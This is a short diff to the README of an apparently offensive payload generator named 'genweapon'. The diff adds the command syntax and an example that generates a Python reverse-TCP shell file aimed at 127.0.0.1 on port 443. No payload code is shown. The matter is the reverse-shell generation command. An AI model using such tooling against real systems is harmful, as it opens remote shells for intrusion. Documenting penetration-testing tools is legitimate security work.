@@ -15,6 +15,13 @@ bash generate PAYLOAD_PATH LHOST LPORT OUTPUT
 ```
 
 #### Creating 
+Syntax: 
+
+```
+$ genweapon generate payloads/path_to_/payloadfile LHOST LPORT OUTPUT_FILE 
+```
+
+Example: 
 ```
 $ genweapon generate payloads/python/reverse_tcp 127.0.0.1 443 /tmp/pyshell.py 
 [-] Generating the payload
